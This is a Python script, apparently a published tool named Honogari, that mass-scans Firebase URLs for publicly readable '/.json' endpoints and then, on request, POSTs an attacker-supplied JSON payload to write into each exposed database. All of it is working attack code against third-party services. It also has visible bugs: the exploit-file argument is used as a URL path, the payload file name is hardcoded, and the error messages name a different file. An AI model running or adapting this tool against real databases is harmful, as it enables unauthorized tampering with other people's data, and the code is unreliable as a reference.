#!/usr/bin/env python3
import requests
import json
import argparse
import os
import sys
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

banner = r"""
                                          _
  /\  /\___  _ __   ___   __ _  __ _ _ __(_)
 / /_/ / _ \| '_ \ / _ \ / _` |/ _` | '__| |
/ __  / (_) | | | | (_) | (_| | (_| | |  | |
\/ /_/ \___/|_| |_|\___/ \__, |\__,_|_|  |_|
                         |___/  -_- Kuroshiro
"""

def verify_json_format(url, cmd, exploit_flag, path, headers, timeout, output_file):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        if not url.endswith('/'):
            url += '/'
        url = f'{url}.json'
        response = requests.get(url, headers=headers, timeout=timeout)
        if response.status_code == 200:
            result = f"[{colored('VULNERABLE', 'green')}] {url}"
            print(result)
            if output_file:
                with open(output_file, 'a') as f:
                    f.write(result + '\n')
            if exploit_flag:
                launch_exploit(url, path, headers, timeout, output_file)
        elif cmd == 'standalone':
            result = f"[{colored('STANDALONE', 'yellow')}] {url}"
            print(result)
            if output_file:
                with open(output_file, 'a') as f:
                    f.write(result + '\n')
    except requests.exceptions.RequestException:
        print(f"[{colored('ERROR', 'red')}] Failed to connect to {url}")

def is_valid_json(data):
    try:
        json.loads(data)
        return True
    except json.JSONDecodeError:
        return False

def launch_exploit(url, path, headers, timeout, output_file):
    if not os.path.exists('honogari.json'):
        print(f"[{colored('ERROR', 'red')}] File 'exploit.json' does not exist")
        exit(1)
    try:
        with open('honogari.json', 'r') as file:
            json_payload = file.read()
            if not is_valid_json(json_payload):
                print(f"[{colored('ERROR', 'red')}] File 'exploit.json' is not in proper JSON format")
                exit(1)
            exploit_url = url.rstrip('/').rstrip('.json')
            if not exploit_url.endswith('/'):
                exploit_url += '/'
            exploit_url = f"{exploit_url}{path.lstrip('/')}"
            response = requests.post(exploit_url, json=json.loads(json_payload), headers={**headers, 'Content-Type': 'application/json'}, timeout=timeout)
            result = f"[{colored('EXPLOITED', 'light_green')}] {exploit_url}" if response.status_code == 200 else f"[{colored('FAILED', 'red')}] {exploit_url}"
            print(result)
            if output_file:
                with open(output_file, 'a') as f:
                    f.write(result + '\n')
    except Exception:
        print(f"[{colored('ERROR', 'red')}] Error reading file 'exploit.json'")

def main():
    print(banner)
    parser = argparse.ArgumentParser(description='Honogari: A penetration testing tool designed to identify and exploit misconfigured or publicly accessible Firebase databases vulnerable to unauthorized access or data manipulation')
    parser.add_argument('-u', '--url', type=str, help='Target Specific Firebase URL')
    parser.add_argument('-uf', '--url-file', type=str, help='File Path of the List of Firebase URLs')
    parser.add_argument('-e', '--exploit', action='store_true', help='Exploit the Vulnerable URL(s)')
    parser.add_argument('-ef', '--exploit-file', type=str, default='honogari.json', help='URI File Name for the Exploit')
    parser.add_argument('-H', '--headers', type=str, default='{}', help='Custom HTTP Headers in JSON format')
    parser.add_argument('-to', '--timeout', type=int, default=10, help='Timeout for HTTP requests')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of concurrent threads')
    parser.add_argument('-o', '--output', type=str, help='Output file to save results')
    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    if not args.url and not args.url_file:
        print(f"[{colored('ERROR', 'red')}] Must provide either URL or file path")
        exit(1)
    headers = json.loads(args.headers)
    output_file = args.output if args.output else None
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        if args.url:
            executor.submit(verify_json_format, args.url, 'standalone', args.exploit, args.exploit_file, headers, args.timeout, output_file)
        if args.url_file:
            with open(args.url_file, 'r') as file:
                for line in file:
                    executor.submit(verify_json_format, line.strip(), 'file', args.exploit, args.exploit_file, headers, args.timeout, output_file)

if __name__ == '__main__':
    main()

